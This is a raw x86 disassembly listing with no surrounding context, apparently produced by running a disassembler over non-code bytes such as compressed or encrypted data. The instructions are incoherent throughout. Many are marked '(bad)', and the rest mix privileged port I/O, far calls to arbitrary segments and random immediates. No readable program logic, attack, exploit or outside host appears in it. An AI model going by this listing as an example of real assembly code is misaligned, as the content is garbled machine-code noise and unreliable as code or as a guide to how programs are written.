  423f23:	mov    ch,0xbb
  423f25:	in     eax,dx
  423f26:	call   0x1:0x700017e
  423f2d:	add    BYTE PTR [ebx-0x3adb9e61],bl
  423f33:	cwde   
  423f34:	push   eax
  423f35:	in     al,0xad
  423f37:	(bad)
  423f3b:	(bad)  
  423f3c:	add    BYTE PTR [edi+0x39],al
  423f3f:	hlt    
  423f40:	sbb    cl,al
  423f42:	out    0x85,eax
  423f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f45:	stos   DWORD PTR es:[edi],eax
  423f46:	sub    eax,0xf47049ee
  423f4b:	lods   eax,DWORD PTR ds:[esi]
  423f4c:	xor    DWORD PTR [ebx+edx*8+0x345848c1],esi
  423f53:	sbb    ebp,DWORD PTR [eax+0x173bef93]
  423f59:	adc    BYTE PTR [eax+ebp*1-0x2d63980f],dl
  423f60:	loope  0x423f12
  423f62:	cmp    al,cl
  423f64:	imul   edi,DWORD PTR ds:0xd92705f0,0x34779d73
  423f6e:	aam    0x91
  423f70:	dec    edi
  423f71:	sti    
  423f72:	push   esp
  423f73:	xchg   ebx,eax
  423f74:	out    0x37,eax
  423f76:	jne    0x423fde
  423f78:	and    eax,0x12a49cb6
  423f7d:	lods   al,BYTE PTR ds:[esi]
  423f7e:	add    DWORD PTR [ebx],eax
  423f80:	dec    edx
  423f81:	inc    ebx
  423f82:	jmp    0xa66a:0x2aa426b3
  423f89:	mov    ebp,0xc7d58e51
  423f8e:	je     0x423f1a
  423f90:	fsub   DWORD PTR [ecx-0x5615793b]
  423f96:	nop
  423f97:	inc    ebx
  423f98:	popa   
  423f99:	jb     0x423f78
  423f9b:	jbe    0x423f30
  423f9d:	add    DWORD PTR [edi+0x5a],edx
  423fa0:	cld    
  423fa1:	ins    DWORD PTR es:[edi],dx
  423fa2:	aaa    
  423fa3:	shr    BYTE PTR ds:0xb645180,cl
  423fa9:	ret    0x8c8f
  423fac:	jbe    0x423f91
  423fae:	push   0x5d
  423fb0:	fdiv   DWORD PTR [edx-0x307c4849]
  423fb6:	and    cl,BYTE PTR [edi+0x26f6cac1]
  423fbc:	xchg   ecx,eax
  423fbd:	cmp    al,0xfd
  423fbf:	test   esp,0x3181072c
  423fc5:	jae    0x423f78
  423fc7:	xor    BYTE PTR [eax],bh
  423fc9:	retf   
  423fca:	out    dx,eax
  423fcb:	mov    edi,0x15103a50
  423fd0:	(bad)  
  423fd1:	loopne 0x423f5f
  423fd3:	cmp    ebp,DWORD PTR [edi-0x1511d03f]
  423fd9:	push   eax
  423fda:	add    eax,0xa611a386
  423fdf:	data16 jno 0x423fbb
  423fe2:	push   es
  423fe3:	ror    BYTE PTR [edi],cl
  423fe5:	test   DWORD PTR cs:[edi-0x55],eax
  423fe9:	push   0x29531e72
  423fee:	push   es
  423fef:	jp     0x423fe0
  423ff1:	popa   
  423ff2:	jb     0x424043
  423ff4:	fwait
  423ff5:	pop    ecx
  423ff6:	mov    bh,0x88
  423ff8:	pop    ebx
  423ff9:	icebp  
  423ffa:	std    
  423ffb:	or     ebp,0xffffffe7
  423ffe:	add    al,0x71
  424000:	adc    BYTE PTR [ebx-0x6f557589],ah
  424006:	sbb    BYTE PTR ds:0x4ecabb42,bl
  42400c:	ins    DWORD PTR es:[edi],dx
  42400d:	shl    esp,1
  42400f:	jg     0x423f96
  424011:	dec    eax
  424012:	xor    DWORD PTR [ebp+0x42],edx
  424015:	xchg   ecx,eax
  424016:	push   ecx
  424017:	aam    0x8f
  424019:	dec    eax
  42401a:	mov    bl,0x85
  42401c:	and    dh,al
  42401e:	test   ch,cl
  424020:	xchg   esp,eax
  424021:	mov    ah,0xd
  424023:	mov    edi,0xcf943e28
  424028:	push   ebp
  42402a:	pop    esi
  42402b:	clc    
  42402c:	pause  
  42402e:	pop    esp
  42402f:	jp     0x424046
  424031:	dec    ecx
  424032:	xor    DWORD PTR [eax+0x6c],eax
	...
  424094:	add    BYTE PTR [eax],al
  424096:	jl     0x4240f0
  424098:	cs mov cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x3b55e30f]
  4240a3:	(bad)  
  4240a4:	cmp    DWORD PTR [eax+0x17fa1],0x7
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [edx],al
  4240af:	or     al,0x8a
  4240b1:	jecxz  0x424115
  4240b3:	and    ah,BYTE PTR [esi-0x2e9c8b9]
  4240b9:	sub    DWORD PTR [eax+0x3656f858],eax
  4240bf:	loope  0x42406d
  4240c1:	jb     0x42409b
  4240c3:	cmp    DWORD PTR [edi+0x21],esp
  4240c6:	sub    bl,BYTE PTR [esi]
  4240c8:	sub    edx,DWORD PTR [esi+ecx*1+0x52]
  4240cc:	arpl   WORD PTR [edx],ax
  4240ce:	add    al,0x2d
  4240d0:	mov    eax,ds:0xac2b21fd
  4240d5:	rcr    DWORD PTR [edx-0x23d3190e],1
  4240db:	sti    
  4240dc:	(bad)  
  4240de:	(bad)  
  4240df:	in     al,dx
  4240e0:	mov    ds:0xe8b4fdd1,al
  4240e5:	rcr    esi,cl
  4240e7:	lock outs dx,BYTE PTR ds:[esi]
  4240e9:	pop    ebx
  4240ea:	imul   eax,DWORD PTR [edx-0x6ee415b9],0xffffffd9
  4240f1:	test   cl,al
  4240f3:	xor    DWORD PTR [eax+0x7cee10],edi
  4240f9:	loope  0x42410a
  4240fb:	inc    eax
  4240fc:	mov    cl,0xe7
  4240fe:	mov    ebp,0x8adc8210
  424103:	rcl    DWORD PTR es:[esi],cl
  424106:	dec    DWORD PTR [edi+ebx*8-0x62efce9c]
  42410d:	push   ecx
  42410e:	jb     0x42412f
  424110:	fst    st(1)
  424112:	icebp  
  424113:	sbb    DWORD PTR [edx-0xe0980d8],edx
  424119:	pop    esp
  42411a:	fnstcw WORD PTR [ebx+0x1b8b6b16]
  424120:	add    al,0x3a
  424122:	sbb    esi,DWORD PTR [ebp-0x21]
  424125:	dec    ebx
  424126:	xchg   edx,eax
  424127:	or     esp,edi
  424129:	loopne 0x424102
  42412b:	lds    eax,FWORD PTR [ecx]
  42412d:	pop    esp
  42412e:	inc    ebp
  42412f:	mov    dh,0x9e
  424131:	popa   
  424132:	and    al,0x1f
  424134:	lds    edi,FWORD PTR [eax-0x787cdd8d]
  42413a:	cmp    eax,0xee05ede4
  42413f:	call   0x139fdece
  424144:	pop    edx
  424145:	loope  0x424125
  424147:	jbe    0x424147
  424149:	push   fs
  42414b:	aad    0x9e
  42414d:	jle    0x4241ab
  42414f:	dec    eax
  424150:	icebp  
  424151:	xor    eax,0xe9f9e7d2
  424156:	leave  
  424157:	sub    BYTE PTR [edx-0x1f],dh
  42415a:	sbb    edi,ebp
  42415c:	cwde   
  42415d:	push   0x95e77dbe
  424162:	sar    DWORD PTR [ecx-0x12],cl
  424165:	stos   BYTE PTR es:[edi],al
  424166:	or     eax,0x4b8de799
  42416b:	stos   BYTE PTR es:[edi],al
  42416c:	mov    eax,ds:0xc42403a0
  424171:	xor    BYTE PTR [eax-0x74],dl
  424174:	popf   
  424175:	or     edx,DWORD PTR [edi-0x2c2d2ecc]
  42417b:	push   eax
  42417c:	pushf  
  42417d:	cwde   
  42417e:	add    edx,ebp
  424180:	shr    bl,0x35
  424183:	jle    0x424142
  424185:	mov    bh,0x77
  424187:	in     eax,dx
  424188:	sub    BYTE PTR [ebx-0x57],al
  42418b:	scas   al,BYTE PTR es:[edi]
  42418c:	sahf   
  42418d:	sti    
  42418e:	mov    ds:0x2c09cde,al
  424193:	mov    eax,0x3b94df9a
  424198:	lds    esp,FWORD PTR [ecx-0x33a5ba4d]
  42419e:	loope  0x424153
  4241a0:	js     0x4241b3
  4241a2:	fs xor eax,0x597570a9
  4241a8:	popa   
  4241a9:	lock sub DWORD PTR [edx],esp
  4241ac:	push   es
  4241ad:	dec    ebp
  4241ae:	call   0xd86c:0x958b63d9
	...
  424215:	add    BYTE PTR [edi-0x4c275c4c],al
  42421b:	(bad)  
  42421d:	call   DWORD PTR [edi+0x63d4b417]
  424223:	cli    
  424224:	xchg   ebx,eax
  424225:	in     al,dx
  424226:	test   al,0x80
  424228:	add    DWORD PTR [eax],eax
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [esi],ah
  42422f:	stc    
  424230:	adc    eax,0x3796ffed
  424235:	js     0x424233
  424237:	cmp    al,0xdc
  424239:	push   ds
  42423a:	outs   dx,DWORD PTR ds:[esi]
  42423b:	test   DWORD PTR [edi],ebp
  42423d:	iret   
  42423e:	pop    ds
  42423f:	test   al,0x46
  424241:	shl    BYTE PTR [esi],cl
  424243:	add    BYTE PTR [ecx-0x6d37eb3e],cl
  424249:	lods   eax,DWORD PTR ds:[esi]
  42424a:	test   BYTE PTR [eax-0x31092253],dh
  424250:	aaa    
  424251:	inc    ebp
  424252:	test   al,0x34
  424254:	pop    ds
  424255:	pop    eax
  424256:	in     eax,0x2a
  424258:	xchg   ebp,eax
  424259:	out    dx,al
  42425a:	and    eax,DWORD PTR [ebp-0x340a1f4d]
  424260:	addr16 jno 0x4241e3
  424263:	ret    
  424264:	lds    eax,FWORD PTR [edi-0x2e2bfcf7]
  42426a:	pop    ebx
  42426b:	call   0x6eb67d00
  424270:	dec    esi
  424271:	sbb    BYTE PTR [ebx-0x20],0xe7
  424275:	push   ebp
  424276:	dec    ecx
  424277:	call   0xe468:0x3df9cd71
  42427e:	inc    edi
  42427f:	loope  0x424295
  424281:	dec    esp
  424282:	sbb    BYTE PTR [ecx+0x61a19b1a],bl
  424288:	jnp    0x424242
  42428a:	cmp    eax,0x24264986
  42428f:	ins    DWORD PTR es:[edi],dx
  424290:	sbb    edi,esp
  424292:	test   BYTE PTR [ecx-0x1e1c1bb],bh
  424298:	adc    eax,0xbf41103f
  42429d:	rcr    DWORD PTR [ebp+0x22],0x32
  4242a1:	ror    BYTE PTR [edx],1
  4242a3:	das    
  4242a4:	xchg   edi,eax
  4242a5:	retf   
  4242a6:	jmp    FWORD PTR [esi*1-0x6955d731]
  4242ad:	add    esi,DWORD PTR [ebx+0x4ba04283]
  4242b3:	xchg   ecx,eax
  4242b4:	or     DWORD PTR [ebx-0x6c],0x7
  4242b8:	pop    ss
  4242b9:	inc    ebx
  4242ba:	push   esi
  4242bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242bc:	mov    ah,0x78
  4242be:	add    dh,BYTE PTR [eax]
  4242c0:	mov    cl,0xa4
  4242c2:	jmp    0x67ed:0x9ab04bf9
  4242c9:	fimul  DWORD PTR [ecx]
  4242cb:	mov    edi,0x31c9c5b2
  4242d0:	enter  0xba48,0xab
  4242d4:	shl    esi,1
  4242d6:	add    al,0xb4
  4242d8:	out    0x74,al
  4242da:	adc    eax,0xfdbfc761
  4242df:	fnstenv [eax+0x6f1974fc]
  4242e5:	cs jnp 0x424274
  4242e8:	xchg   edx,eax
  4242e9:	sub    eax,0xa8731bbb
  4242ee:	int3   
  4242ef:	adc    al,0xb8
  4242f1:	mov    esi,0x6986161e
  4242f6:	mov    edx,0x1034ee7f
  4242fb:	adc    BYTE PTR gs:[ebx+0x38],0x6b
  424300:	not    edi
  424302:	mov    ecx,0xc0092c12
  424307:	outs   dx,DWORD PTR ds:[esi]
  424308:	mov    ah,0xf
  42430a:	in     al,dx
  42430b:	call   0xe375:0x726fa456
  424312:	fidivr DWORD PTR [edi]
  424314:	outs   dx,DWORD PTR ds:[esi]
  424315:	aam    0xec
  424317:	fs jmp 0xcb8b:0xe04dbadc
  42431f:	and    al,0x99
  424321:	push   edi
  424322:	xor    bh,BYTE PTR [ebx]
  424324:	test   BYTE PTR [edx+edi*1+0x71f716cc],dl
  42432b:	(bad)  
  42432c:	jmp    0x4242cc
  42432e:	daa    
  42432f:	je     0x4242c4
  424331:	add    BYTE PTR [edx],al
  424333:	jno    0x42439f
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	or     al,0x76
  4243a4:	jnp    0x424406
  4243a6:	scas   eax,DWORD PTR es:[edi]
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    BYTE PTR [ebx],ch
  4243af:	jmp    0xb2873d29
  4243b4:	ins    BYTE PTR es:[edi],dx
  4243b5:	cmp    DWORD PTR [edi+0x79],eax
  4243b8:	test   eax,0xa4dc81f4
  4243bd:	fdivr  st,st(3)
  4243bf:	cmp    DWORD PTR [ecx-0x29ef9e3e],edx
  4243c5:	fmul   DWORD PTR [ebx-0x35]
  4243c8:	xchg   edi,eax
  4243c9:	pop    esp
  4243ca:	xchg   ebx,eax
  4243cb:	test   DWORD PTR [edi-0x4574747b],ebx
  4243d1:	and    esi,DWORD PTR [eax]
  4243d3:	retf   0xf80c
  4243d6:	dec    ebp
  4243d7:	dec    eax
  4243d8:	cs cmp ah,ch
  4243db:	jge    0x4243e4
  4243dd:	inc    ecx
  4243de:	xor    BYTE PTR [ecx-0x7635c4cc],dh
  4243e4:	leave  
  4243e5:	jle    0x42437c
  4243e7:	cdq    
  4243e8:	inc    ebx
  4243e9:	mov    ebx,0x76264d4
  4243ee:	(bad)  
  4243f0:	xchg   esi,eax
  4243f1:	imul   ebx
  4243f3:	cli    
  4243f4:	cwde   
  4243f5:	and    esi,DWORD PTR [ecx+0x5f]
  4243f8:	out    0x2,eax
  4243fa:	xchg   esi,eax
  4243fb:	cmp    eax,0x68f4390c
  424400:	mov    ebp,0xa3415280
  424405:	pop    eax
  424406:	stos   DWORD PTR es:[edi],eax
  424407:	out    0xa6,eax
  424409:	aas    
  42440a:	or     ebp,esp
  42440c:	out    0xa4,al
  42440e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42440f:	jmp    DWORD PTR [ecx-0x7a]
  424412:	mov    ebx,DWORD PTR [edi-0x43bdec41]
  424418:	into   
  424419:	push   ss
  42441a:	imul   BYTE PTR ds:0x7743f518
  424420:	clc    
  424421:	sbb    al,0xac
  424423:	fsubr  DWORD PTR [edx]
  424425:	das    
  424426:	lods   al,BYTE PTR ds:[esi]
  424427:	bound  ecx,QWORD PTR [edx+ecx*2-0x79]
  42442b:	jmp    0x4f5ecea9
  424430:	ror    DWORD PTR [ebp+edi*4-0x4660deef],1
  424437:	cmp    DWORD PTR [eax-0x28],edx
  42443a:	push   ds
  42443b:	adc    eax,0xe80dff21
  424440:	sub    al,0x17
  424442:	daa    
  424443:	xchg   ebx,eax
  424444:	inc    esp
  424445:	test   al,0x1d
  424447:	sar    BYTE PTR [ecx-0xe],1
  42444a:	scas   al,BYTE PTR es:[edi]
  42444b:	jno    0x4244a9
  42444d:	mov    edi,0x302070fb
  424452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424453:	mov    ah,0xda
  424455:	daa    
  424456:	pusha  
  424457:	pop    ss
  424458:	jbe    0x42443b
  42445a:	ficom  WORD PTR [esi-0x6d]
  42445d:	mov    al,ds:0x453efa24
  424462:	push   ss
  424463:	add    eax,0xacd83f6e
  424468:	(bad)
  42446c:	mov    dh,0xcc
  42446e:	das    
  42446f:	xchg   ecx,eax
  424470:	ins    BYTE PTR es:[edi],dx
  424471:	and    BYTE PTR [edi-0x3cfc7fa8],dl
  424477:	inc    esp
  424478:	fsubr  st,st(2)
  42447a:	pop    ecx
  42447b:	add    edx,DWORD PTR [edx]
  42447d:	jle    0x424499
  42447f:	mov    cl,0x8a
  424481:	rcr    dh,0x7
  424484:	push   eax
  424485:	xor    DWORD PTR [eax-0x5a986d78],ecx
  42448b:	cmp    al,0x70
  42448d:	add    BYTE PTR [edx+edi*8],bh
  424490:	jae    0x424467
  424492:	dec    edi
  424493:	scas   eax,DWORD PTR es:[edi]
  424494:	xchg   ebx,eax
  424495:	ret    
  424496:	retf   
  424497:	sbb    al,0xe1
  424499:	in     eax,dx
  42449a:	and    dh,BYTE PTR [ecx+ecx*2+0xf]
  42449e:	es adc eax,0x4d2eec08
  4244a4:	dec    esi
  4244a5:	ja     0x4244ac
  4244a7:	sub    BYTE PTR [edi+0x10b53f2e],ah
  4244ad:	sub    BYTE PTR [edi-0x2b],al
  4244b0:	pop    ebp
  4244b1:	xchg   edi,eax
  4244b2:	mov    eax,0x4176
	...
  424513:	add    BYTE PTR [eax],al
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0xb0ff3ab
  424523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424524:	aaa    
  424525:	hlt    
  424526:	mov    dh,0x82
  424528:	add    DWORD PTR [eax],eax
  42452a:	pop    es
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR [edx+eiz*2+0x59],cl
  424531:	aas    
  424532:	mov    BYTE PTR [esi-0x50],bl
  424535:	xchg   ebx,eax
  424536:	add    DWORD PTR [ebp+0x743d2af0],ebx
  42453c:	fdivr  st(6),st
  42453e:	ins    BYTE PTR es:[edi],dx
  42453f:	int    0x2f
  424541:	addr16 jnp 0x4244d3
  424544:	add    dl,0xca
  424547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424548:	pop    edi
  424549:	mov    cs:0x131ecd8a,al
  42454f:	push   esi
  424550:	clc    
  424551:	sbb    BYTE PTR [eax+0x1a20da4e],bh
  424557:	bound  ecx,QWORD PTR ds:0x4c182680
  42455d:	xlat   BYTE PTR ds:[ebx]
  42455e:	sti    
  42455f:	jno    0x4244ef
  424561:	arpl   WORD PTR [ebx+0x30],cx
  424564:	mov    dl,0x47
  424566:	in     eax,0x26
  424568:	or     ebp,0xe1c25fed
  42456e:	pop    es
  42456f:	ret    
  424570:	test   DWORD PTR [eax+0x1a],esi
  424573:	jae    0x4245e3
  424575:	mov    ebp,0x6c487ab7
  42457a:	inc    ebx
  42457b:	js     0x42454f
  42457d:	lods   eax,DWORD PTR ds:[esi]
  42457e:	dec    ebx
  42457f:	and    DWORD PTR [edx+0x7a13249a],ebp
  424585:	int    0xd1
  424587:	call   0xce8a:0x5975500c
  42458e:	push   edi
  42458f:	add    DWORD PTR [ebp-0x26],eax
  424592:	retf   0x1a3d
  424595:	mov    ah,0xc6
  424597:	cmc    
  424598:	and    eax,DWORD PTR [esi-0x2c]
  42459b:	mov    ds:0x4b5c01d0,al
  4245a0:	add    BYTE PTR [ebx+0x7e],bh
  4245a3:	popf   
  4245a4:	mov    ds:0xf254c4f1,eax
  4245a9:	(bad)  
  4245ab:	pop    esp
  4245ac:	jecxz  0x42457e
  4245ae:	jmp    0x424621
  4245b0:	mov    dh,0x5
  4245b2:	adc    al,0x5e
  4245b4:	mov    bl,0xb2
  4245b6:	inc    edx
  4245b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245b8:	pop    ecx
  4245b9:	test   al,0x15
  4245bb:	sub    dl,BYTE PTR [ebp+0x72b9f0b0]
  4245c1:	out    dx,al
  4245c2:	out    dx,eax
  4245c3:	aas    
  4245c4:	adc    al,0xa
  4245c6:	mov    ecx,0x5f3e19d5
  4245cb:	xchg   DWORD PTR [edi+ecx*1],edi
  4245ce:	inc    esp
  4245cf:	pop    ebp
  4245d0:	rcr    DWORD PTR cs:[esi+0x33d29070],1
  4245d7:	add    edx,DWORD PTR [edx-0x23]
  4245da:	jnp    0x42458c
  4245dc:	(bad)  
  4245dd:	imul   ebp,DWORD PTR [ebx+0x606f8984],0xc01f7e11
  4245e7:	jbe    0x4245f6
  4245e9:	les    eax,FWORD PTR [eax+eiz*2]
  4245ec:	pop    ecx
  4245ed:	dec    esp
  4245ee:	cmp    eax,0x23028716
  4245f3:	call   0xfeee:0xd80790f
  4245fa:	adc    dh,ch
  4245fc:	mov    eax,ds:0xa1b5fdb0
  424601:	rol    BYTE PTR [esi],cl
  424603:	mov    cl,0x82
  424605:	pop    ecx
  424606:	xchg   DWORD PTR [esi-0x714ae5c9],esp
  42460c:	(bad)  
  42460d:	fst    DWORD PTR [ecx+0x49d85cdf]
  424613:	(bad)  
  424614:	or     BYTE PTR [ebx+0x70],dh
  424617:	fadd   st(4),st
  424619:	lods   eax,DWORD PTR ds:[esi]
  42461a:	mov    ebx,0x3af64549
  42461f:	pusha  
  424620:	pushf  
  424621:	dec    edi
  424622:	dec    esp
  424623:	pop    esi
  424624:	add    al,0x55
  424626:	mov    ebp,0x8da3005
  42462b:	sbb    DWORD PTR [ecx-0x28],0x6f7b5094
  424632:	mov    cl,0x1d
  424634:	sbb    al,0x0
	...
  424696:	mov    esp,0xfefffc92
  42469b:	(bad)  
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edx,eax
  4246a3:	jae    0x42466a
  4246a5:	pop    ecx
  4246a6:	mov    ebp,0x7000183
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    bl,al
  4246af:	cs xor eax,0xdb61b958
  4246b5:	adc    eax,0xa8d1b119
  4246ba:	pop    ebp
  4246bb:	shl    DWORD PTR [ebp-0x51563999],0x60
  4246c2:	int    0x5a
  4246c4:	scas   al,BYTE PTR es:[edi]
  4246c5:	pushf  
  4246c6:	sti    
  4246c7:	pop    esp
  4246c8:	sub    ebp,edi
  4246ca:	aam    0x7c
  4246cc:	xor    ebp,DWORD PTR [edx-0x32]
  4246cf:	or     esi,edi
  4246d1:	cmp    edx,eax
  4246d3:	mov    esi,0x2582e387
  4246d8:	(bad)  
  4246d9:	mov    edx,0x1a09c0b8
  4246de:	xor    eax,0xa9421fa8
  4246e3:	mov    DWORD PTR [edx-0x15],ecx
  4246e6:	jno    0x424756
  4246e8:	mov    edi,0xdd284c21
  4246ed:	loopne 0x42468a
  4246ef:	sar    DWORD PTR [edi-0x1c252f76],1
  4246f5:	pop    esp
  4246f6:	xor    DWORD PTR [esi],0x8ed649e3
  4246fc:	add    DWORD PTR [edi],eax
  4246fe:	fldenv [ebx+0xe]
  424701:	je     0x4246d5
  424703:	push   es
  424704:	sub    dl,BYTE PTR [esi]
  424706:	aad    0x81
  424708:	fcomp  DWORD PTR [ecx]
  42470a:	mov    ah,0x7e
  42470c:	sub    BYTE PTR [eax],0x71
  42470f:	daa    
  424710:	es push ebx
  424712:	iret   
  424713:	mov    bh,0x59
  424715:	mov    bh,0x46
  424717:	pop    edi
  424718:	ja     0x424751
  42471a:	call   0x413d:0xb1dba0a7
  424721:	mov    dh,0x5e
  424723:	jno    0x4246b9
  424725:	je     0x42475c
  424727:	sbb    al,0x64
  424729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42472a:	mov    cl,0x39
  42472c:	pop    esp
  42472e:	retf   0xc86e
  424731:	imul   esi,DWORD PTR [ebx-0x65],0xffffff9d
  424735:	adc    BYTE PTR [ebp-0x1603d4af],cl
  42473b:	repz into 
  42473d:	popf   
  42473e:	and    bh,BYTE PTR [esi-0x78]
  424741:	cmp    eax,0xf12abc33
  424746:	stos   BYTE PTR es:[edi],al
  424747:	pusha  
  424748:	push   edx
  424749:	cli    
  42474a:	pop    edx
  42474b:	stc    
  42474c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42474d:	call   0xc5ca0b5e
  424752:	in     al,0x80
  424754:	out    0x20,eax
  424756:	adc    al,0xb3
  424758:	mov    al,BYTE PTR [eax]
  42475a:	jp     0x4246dd
  42475c:	push   0xdf87a3f5
  424761:	leave  
  424762:	xchg   BYTE PTR [esi],cl
  424764:	call   0xcf4a:0x4f830db1
  42476b:	jp     0x4247ab
  42476d:	outs   dx,BYTE PTR ds:[esi]
  42476e:	jmp    0x527f:0xd6d91cdf
  424775:	pop    ss
  424776:	cdq    
  424777:	loope  0x424760
  424779:	(bad)  
  42477a:	push   edi
  42477b:	mov    edx,0x1e25d161
  424780:	test   BYTE PTR [ebx],cl
  424782:	arpl   WORD PTR [edi-0x337eb16d],bx
  424788:	(bad)  
  42478a:	test   DWORD PTR [eax+0x148e4880],esi
  424790:	stc    
  424791:	clc    
  424792:	add    al,0xd9
  424794:	sub    BYTE PTR [ebx+0x21],al
  424797:	sub    eax,0xe1bc3ec0
  42479c:	add    eax,0xcb2773e9
  4247a1:	dec    edx
  4247a2:	(bad)  
  4247a3:	push   ebp
  4247a4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4247a6:	inc    ebp
  4247a7:	mov    esp,0xe511f53b
  4247ac:	inc    ebx
  4247ad:	(bad)  
  4247ae:	(bad)  
  4247af:	mov    ebx,0x1334bc59
  4247b4:	hlt    
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax+0x2ffaf822],0xd4
  424825:	dec    esp
  424826:	les    eax,FWORD PTR [ecx+eax*1+0x10700]
  42482d:	add    BYTE PTR [ebx-0x4e],bh
  424830:	cld    
  424831:	outs   dx,DWORD PTR ds:[esi]
  424832:	test   eax,0x7da1542b
  424837:	lea    ebp,[ecx-0x67937599]
  42483d:	outs   dx,BYTE PTR ds:[esi]
  42483e:	pop    ebx
  42483f:	arpl   WORD PTR ds:0xa5abef37,dx
  424845:	in     al,0x16
  424847:	xchg   esp,eax
  424848:	imul   eax,DWORD PTR [edx],0xdd5b3c48
  42484e:	sbb    ah,BYTE PTR [ebx-0xe]
  424851:	or     al,0x2d
  424853:	ret    
  424854:	pop    ebx
  424855:	imul   ecx,DWORD PTR ds:[edi+ebx*1+0x35],0x5b6b31e7
  42485e:	cmp    al,0xe9
  424860:	ret    0x2dcf
  424863:	sbb    al,0x93
  424865:	or     DWORD PTR [ebx+eiz*1],edx
  424868:	add    ch,BYTE PTR [esi]
  42486a:	imul   edx,DWORD PTR [ecx+0x6584ef59],0x957613bb
  424874:	(bad)  
  424875:	lods   eax,DWORD PTR ds:[esi]
  424876:	fsub   st,st(3)
  424878:	addr16 out 0xb1,eax
  42487b:	out    0x41,al
  42487d:	mov    dl,0xe2
  42487f:	dec    esp
  424880:	mov    al,0x26
  424882:	push   esp
  424883:	mov    edx,DWORD PTR [esi-0x6c]
  424886:	jp     0x424848
  424888:	xchg   DWORD PTR [ebx-0x66],ebp
  42488b:	mov    bh,al
  42488d:	cmp    ch,BYTE PTR [ecx]
  42488f:	mov    ecx,0xa55d8efe
  424894:	xchg   DWORD PTR [ecx-0x127df42d],ebx
  42489a:	fidiv  DWORD PTR [ebx]
  42489c:	out    0x42,al
  42489e:	btr    edx,esp
  4248a1:	cli    
  4248a2:	scas   al,BYTE PTR es:[edi]
  4248a3:	sub    DWORD PTR [edx],0xee31c21d
  4248a9:	pop    edx
  4248aa:	jl     0x42489f
  4248ac:	aam    0xc4
  4248ae:	push   eax
  4248af:	mov    BYTE PTR [edi],dh
  4248b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248b2:	mov    eax,0xf4cdab0
  4248b7:	fisub  DWORD PTR [ecx-0x7f139702]
  4248bd:	inc    esi
  4248be:	adc    dl,ch
  4248c0:	shl    dh,cl
  4248c2:	or     al,BYTE PTR [edx]
  4248c4:	out    0x37,al
  4248c6:	out    0x6,eax
  4248c8:	adc    esp,edx
  4248ca:	icebp  
  4248cb:	outs   dx,BYTE PTR ds:[esi]
  4248cc:	test   eax,0xdff30842
  4248d1:	mov    ebp,0x59662ef7
  4248d6:	(bad)  
  4248d7:	mov    dh,0xa
  4248d9:	daa    
  4248da:	(bad)  
  4248db:	shl    DWORD PTR [ecx],1
  4248dd:	and    bh,BYTE PTR [ebx-0x16d97aff]
  4248e3:	fld    DWORD PTR [esi]
  4248e5:	fild   WORD PTR [esi+0x60]
  4248e8:	enter  0xc874,0x8e
  4248ec:	inc    esi
  4248ed:	or     BYTE PTR [edx+0x1d],ah
  4248f0:	inc    edi
  4248f1:	repz arpl WORD PTR [esp+ecx*1+0x75],bp
  4248f6:	jmp    0xe80ec73d
  4248fb:	cmp    esp,DWORD PTR [ebx]
  4248fd:	test   DWORD PTR [di-0x8bf],edx
  424902:	xor    edi,ecx
  424904:	lods   al,BYTE PTR ds:[esi]
  424905:	sub    eax,DWORD PTR [eax]
  424907:	mov    ebp,0x424a7b25
  42490c:	test   BYTE PTR [eax-0x5a13df13],0xf7
  424913:	call   0x5d1b:0x32da9055
  42491a:	sbb    al,0x59
  42491c:	and    dh,0x58
  42491f:	cld    
  424920:	add    DWORD PTR [ecx+0x38],ecx
  424923:	xlat   BYTE PTR ds:[ebx]
  424924:	fisubr DWORD PTR [ebp-0x15]
  424927:	and    eax,0xe1c8ae35
  42492c:	sbb    cl,BYTE PTR [esi-0x29]
  42492f:	add    DWORD PTR [ebx+0x40],esi
  424932:	xor    al,0x10
  424934:	jno    0x424936
	...
  424996:	imul   ebx,DWORD PTR [eax],0x63
  424999:	push   0x73
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0xa397bac2
  4249a4:	test   BYTE PTR [ecx+0x185cb],bh
  4249aa:	pop    es
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    bh,ah
  4249af:	cs call 0x7fdf:0x40ebef5c
  4249b7:	jge    0x424a0e
  4249b9:	xchg   ah,al
  4249bb:	sub    DWORD PTR [ebx+0x30],ecx
  4249be:	fwait
  4249bf:	sub    DWORD PTR [ecx-0x5cf4d3bb],edi
  4249c5:	leave  
  4249c6:	and    edx,ebx
  4249c8:	lods   eax,DWORD PTR ds:[esi]
  4249c9:	mov    eax,0xf8656a30
  4249ce:	in     al,0x61
  4249d0:	push   esi
  4249d1:	loope  0x42495b
  4249d3:	ss sbb al,0xb4
